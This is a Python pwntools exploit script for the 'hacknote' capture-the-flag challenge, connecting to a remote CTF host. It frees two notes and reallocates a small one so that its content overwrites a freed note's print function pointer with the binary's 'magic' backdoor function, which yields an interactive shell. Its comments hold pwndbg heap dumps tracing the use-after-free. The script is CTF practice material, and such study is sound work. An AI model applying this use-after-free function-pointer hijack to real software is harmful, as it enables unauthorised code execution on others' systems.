from pwn import *
context.arch='i386'
# context.log_level="DEBUG"

# p = process('./hacknote')
p = remote('node3.buuoj.cn',27576)

def add(size,content):
    p.recvuntil("Your choice :")
    p.send('1')
    p.recvuntil("Note size :")
    p.send(str(size))
    p.recvuntil("Content :")
    p.send(content)

def delete(index):
    p.recvuntil("Your choice :")
    p.send('2')
    p.recvuntil("Index :")
    p.send(str(index))

def prints(index):
    p.recvuntil("Your choice :")
    p.send('3')
    p.recvuntil("Index :")
    p.send(str(index))

def debug():
    gdb.attach(p)
    pause()

add(0x20,'AAAA')
# add one and free it,and add new smaller
# could not rewrite the function print
# pwndbg> parseheap
# addr                prev                size                 status              fd                bk                
# 0x972c000           0x0                 0x10                 Used                None              None
# 0x972c010           0x0                 0x28                 Freed                0x0              None
# 0x972c038           0x0                 0x10                 Used                None              None
# pwndbg> x/16w 0x972c000
# 0x972c000:  0x00000000  0x00000011  0x080485fb  0x0972c040
# 0x972c010:  0x00000000  0x00000029  0x00000000  0x00000000
# 0x972c020:  0x00000000  0x00000000  0x00000000  0x00000000
# 0x972c030:  0x00000000  0x00000000  0x00000000  0x00000011
# pwndbg> x/16w 0x0972c040
# 0x972c040:  0x43434343  0x00000000  0x00000000  0x00020fb9
# 0x972c050:  0x00000000  0x00000000  0x00000000  0x00000000
# 0x972c060:  0x00000000  0x00000000  0x00000000  0x00000000
# 0x972c070:  0x00000000  0x00000000  0x00000000  0x00000000
# pwndbg> 

add(0x20,'BBBB')
delete(0)
delete(1)
add(8,p32(ELF('hacknote',checksec=False).sym['magic']))
# add(8,'CCCC')
# when we add twice and free them both, and add another smaller one, the new added's content was just start at first added's function print
# so, we just to rewrite the func print and get shell by the backdoor function(magic)
# later, just call  print_note() to execve the fake function print(magic), and get shell
# debug()
# pwndbg> parseheap
# addr                prev                size                 status              fd                bk                
# 0x9f9a000           0x0                 0x10                 Used                None              None
# 0x9f9a010           0x0                 0x28                 Freed                0x0              None
# 0x9f9a038           0x0                 0x10                 Used                None              None
# 0x9f9a048           0x0                 0x28                 Freed          0x9f9a010              None
# pwndbg> x/16w 0x9f9a000
# 0x9f9a000:  0x00000000  0x00000011  0x43434343  0x09f9a018
# 0x9f9a010:  0x00000000  0x00000029  0x00000000  0x00000000
# 0x9f9a020:  0x00000000  0x00000000  0x00000000  0x00000000
# 0x9f9a030:  0x00000000  0x00000000  0x00000000  0x00000011


prints(0)
# debug()
p.interactive()